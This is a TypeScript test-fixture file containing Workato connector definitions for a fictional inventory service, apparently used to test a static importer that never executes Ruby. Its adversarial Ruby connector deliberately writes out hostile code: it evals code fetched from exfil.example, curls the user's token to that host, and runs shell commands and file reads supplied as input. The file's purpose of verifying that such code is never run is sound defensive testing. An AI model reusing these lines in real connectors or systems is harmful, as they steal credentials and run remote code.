/*
 * Workato fixtures, authored here.
 *
 * License and provenance: both fixtures are original minimal examples written
 * for this repository against the published Workato connector SDK reference
 * (retrieved 2026-09-18; see `src/server/connectors/formats/workato/profile.ts`
 * for the exact pages). No connector from Workato's community library or from
 * any customer connector is copied or redistributed. "Stockroom" is a
 * fictional service and every host is on a reserved domain.
 *
 * There is no Ruby interpreter in this repository and these strings are never
 * given to one. The adversarial fixture is written so that *if* it were ever
 * run, it would leave evidence; the tests assert it did not.
 */

/** A Workato connector in the vendor's Ruby DSL. */
export const nativeConnectorRuby = `{
  title: 'Stockroom',

  connection: {
    fields: [
      {
        name: 'api_key',
        label: 'API key',
        control_type: 'password',
        optional: false,
        hint: 'Found under Settings, API access in the Stockroom console.'
      },
      {
        name: 'warehouse',
        label: 'Warehouse code',
        optional: true,
        hint: 'Leave blank to use the default warehouse.'
      }
    ],

    authorization: {
      type: 'api_key',

      apply: lambda do |connection|
        headers('X-Stockroom-Key': connection['api_key'])
      end
    },

    base_uri: lambda do |connection|
      'https://api.stockroom.example'
    end
  },

  test: lambda do |connection|
    get('/v1/whoami')
  end,

  object_definitions: {
    item: {
      fields: lambda do |connection, config_fields, object_definitions|
        [
          { name: 'sku' },
          { name: 'quantity', type: 'integer' },
          { name: 'updated_at', type: 'date_time' }
        ]
      end
    }
  },

  actions: {
    adjust_stock: {
      title: 'Adjust stock',
      subtitle: 'Adjust the quantity of one item',
      description: 'Adjust <span class="provider">stock</span> in <span class="provider">Stockroom</span>',

      input_fields: lambda do |object_definitions|
        [
          { name: 'sku', optional: false, label: 'SKU' },
          { name: 'delta', type: 'integer', optional: false, label: 'Change by' }
        ]
      end,

      execute: lambda do |connection, input|
        post("/v1/items/#{input['sku']}/adjust", quantity_delta: input['delta'])
      end,

      output_fields: lambda do |object_definitions|
        object_definitions['item']
      end
    },

    lookup_item: {
      title: 'Look up item',
      input_fields: [
        { name: 'sku', optional: false, label: 'SKU' }
      ],
      execute: lambda do |connection, input|
        get("/v1/items/#{input['sku']}")
      end,
      output_fields: [
        { name: 'sku' },
        { name: 'quantity', type: 'integer' }
      ]
    }
  },

  triggers: {
    new_shipment: {
      title: 'New shipment',
      description: 'New shipment in Stockroom',
      input_fields: [
        { name: 'since', type: 'date_time', optional: true }
      ],
      poll: lambda do |connection, input, closure|
        page = get('/v1/shipments', since: input['since'])
        { events: page['shipments'], next_poll: page['cursor'], can_poll_more: false }
      end,
      dedup: lambda do |record|
        record['id']
      end,
      output_fields: [
        { name: 'id' },
        { name: 'shipped_at', type: 'date_time' }
      ]
    }
  },

  pick_lists: {
    warehouses: lambda do |connection|
      get('/v1/warehouses')['warehouses'].map { |w| [w['name'], w['code']] }
    end
  },

  methods: {
    format_sku: lambda do |input|
      input['sku'].to_s.upcase
    end
  }
}
`;

/**
 * The same connector as a `workato-static-profile/1` document: literals are
 * literals, and every Ruby lambda is the documented marker. The placement of
 * the API key, which the Ruby states only inside `apply`, is declared here —
 * that declaration is the whole difference between an importable credential
 * and an unsupported one.
 */
export const nativeConnectorProfile = {
  profile: "workato-static-profile/1",
  title: "Stockroom",
  connection: {
    fields: [
      {
        name: "api_key",
        label: "API key",
        control_type: "password",
        optional: false,
        hint: "Found under Settings, API access in the Stockroom console.",
      },
      {
        name: "warehouse",
        label: "Warehouse code",
        optional: true,
        hint: "Leave blank to use the default warehouse.",
      },
    ],
    authorization: {
      type: "api_key",
      apply: { placement: "header", parameter: "X-Stockroom-Key" },
    },
    base_uri: "https://api.stockroom.example",
  },
  test: { $lambda: true },
  object_definitions: {
    item: {
      fields: [
        { name: "sku" },
        { name: "quantity", type: "integer" },
        { name: "updated_at", type: "date_time" },
      ],
    },
  },
  actions: {
    adjust_stock: {
      title: "Adjust stock",
      subtitle: "Adjust the quantity of one item",
      description: "Adjust stock in Stockroom",
      input_fields: [
        { name: "sku", optional: false, label: "SKU" },
        { name: "delta", type: "integer", optional: false, label: "Change by" },
      ],
      output_fields: [
        { name: "sku" },
        { name: "quantity", type: "integer" },
        { name: "updated_at", type: "date_time" },
      ],
      execute: { $lambda: true },
    },
    lookup_item: {
      title: "Look up item",
      input_fields: [{ name: "sku", optional: false, label: "SKU" }],
      output_fields: [{ name: "sku" }, { name: "quantity", type: "integer" }],
      execute: { $lambda: true },
    },
  },
  triggers: {
    new_shipment: {
      title: "New shipment",
      description: "New shipment in Stockroom",
      input_fields: [{ name: "since", type: "date_time", optional: true }],
      output_fields: [
        { name: "id" },
        { name: "shipped_at", type: "date_time" },
      ],
      poll: { $lambda: true },
      dedup: { $lambda: true },
    },
  },
} as const;

/** An OAuth 2.0 variant, to exercise the authorization-code mapping. */
export const oauthConnectorProfile = {
  profile: "workato-static-profile/1",
  title: "Stockroom OAuth",
  connection: {
    fields: [
      { name: "client_id", optional: false },
      { name: "client_secret", control_type: "password", optional: false },
    ],
    authorization: {
      type: "oauth2",
      authorization_url: "https://auth.stockroom.example/oauth/authorize",
      token_url: "https://auth.stockroom.example/oauth/token",
      scopes: ["stock.read", "stock.write"],
      pkce: { challenge_method: "S256" },
      apply: { $lambda: true },
      refresh: { $lambda: true },
    },
    base_uri: "https://api.stockroom.example",
  },
  actions: {
    lookup_item: {
      title: "Look up item",
      input_fields: [{ name: "sku", optional: false }],
      output_fields: [{ name: "sku" }],
      execute: { $lambda: true },
    },
  },
} as const;

/** A client-credentials variant, which the SDK writes as `custom_auth`. */
export const clientCredentialsProfile = {
  profile: "workato-static-profile/1",
  title: "Stockroom Machine",
  connection: {
    fields: [
      { name: "client_id", optional: false },
      { name: "client_secret", control_type: "password", optional: false },
    ],
    authorization: {
      type: "custom_auth",
      oauth2: {
        grant: "client_credentials",
        token_url: "https://auth.stockroom.example/oauth/token",
        scopes: ["stock.read"],
      },
      acquire: { $lambda: true },
      apply: { $lambda: true },
    },
    base_uri: "https://api.stockroom.example",
  },
  actions: {
    lookup_item: {
      title: "Look up item",
      input_fields: [{ name: "sku", optional: false }],
      output_fields: [{ name: "sku" }],
      execute: { $lambda: true },
    },
  },
} as const;

export const nativeConnectorIdentity = {
  nativeId: "stockroom",
  nativeVersion: "2026-09-01",
  displayName: "Stockroom",
  description: "Inventory connector used as an import fixture.",
  service: "stockroom",
};

/**
 * A connector whose every body is Ruby that would do something. If the SDK
 * ever ran it, the top level would write `sentinelPath` and raise; there is
 * no interpreter here, and the tests assert the marker does not exist.
 * It also carries backticks, `system`, `eval`, `File.write`, a heredoc, an
 * interpolated base URI and an authorization type nobody documents.
 */
export function adversarialConnectorRuby(sentinelPath: string): string {
  const marker = JSON.stringify(sentinelPath);
  const shellMarker = JSON.stringify(`${sentinelPath}.shell`);
  return `require 'fileutils'

# Top-level code. Loading this connector leaves evidence.
File.write(${marker}, 'workato-connector-executed')
system("touch #{${shellMarker}}")
\`touch #{${shellMarker}}.backtick\`
raise 'adversarial Workato connector body ran' unless ENV['CEREMONY_IMPOSSIBLE_FLAG']

{
  title: 'Exfil',

  connection: {
    fields: [
      { name: 'token', control_type: 'password', optional: false },
      { name: 'host', optional: false, hint: <<~HINT }
        Any host you like. It will be contacted with your token.
      HINT
    ],

    authorization: {
      type: 'custom_auth',

      acquire: lambda do |connection|
        eval(get('https://exfil.example/bootstrap').body)
      end,

      apply: lambda do |connection|
        headers('Authorization': "Bearer #{connection['token']}")
        params(debug: \`whoami\`)
      end,

      refresh_on: [401, /Unauthorized/]
    },

    base_uri: lambda do |connection|
      "https://#{connection['host']}/api"
    end
  },

  test: lambda do |connection|
    system("curl https://exfil.example/ping?t=#{connection['token']}")
  end,

  actions: {
    run_shell: {
      title: 'Run shell',
      description: 'Runs a command on the Workato worker',

      input_fields: lambda do |object_definitions|
        [{ name: 'command', optional: false }]
      end,

      execute: lambda do |connection, input|
        { output: \`#{input['command']}\` }
      end,

      output_fields: lambda do |object_definitions|
        [{ name: 'output' }]
      end
    },

    read_file: {
      title: 'Read file',
      input_fields: [{ name: 'path', optional: false }],
      execute: lambda do |connection, input|
        { contents: File.read(input['path']) }
      end,
      output_fields: [{ name: 'contents' }]
    }
  },

  triggers: {
    on_anything: {
      title: 'On anything',
      webhook_key: lambda do |connection, input|
        connection['token']
      end,
      webhook_subscribe: lambda do |webhook_url, connection, input, recipe_id|
        post('https://exfil.example/subscribe', url: webhook_url)
      end,
      webhook_notification: lambda do |input, payload|
        payload
      end,
      output_fields: [{ name: 'payload' }]
    }
  },

  webhook_keys: lambda do |params, headers, payload|
    payload['token']
  end,

  methods: {
    shell: lambda do |input|
      system(input['cmd'])
    end
  }
}
`;
}

/** The adversarial connector as a static profile, for the profile path. */
export const adversarialConnectorProfile = {
  profile: "workato-static-profile/1",
  title: "Exfil",
  connection: {
    fields: [
      { name: "token", control_type: "password", optional: false },
      { name: "host", optional: false },
    ],
    authorization: {
      type: "custom_auth",
      acquire: { $lambda: true },
      apply: { $lambda: true },
    },
    base_uri: { $lambda: true },
  },
  test: { $lambda: true },
  actions: {
    run_shell: {
      title: "Run shell",
      description: "Runs a command on the Workato worker",
      input_fields: [{ name: "command", optional: false }],
      output_fields: [{ name: "output" }],
      execute: { $lambda: true },
    },
  },
  triggers: {
    on_anything: {
      title: "On anything",
      output_fields: [{ name: "payload" }],
      webhook_key: { $lambda: true },
      webhook_subscribe: { $lambda: true },
      webhook_notification: { $lambda: true },
    },
  },
  webhook_keys: { $lambda: true },
} as const;

export const adversarialConnectorIdentity = {
  nativeId: "exfil",
  nativeVersion: "2026-09-18",
  displayName: "Exfil",
  description: "A connector whose every body is code.",
  service: "exfil",
};
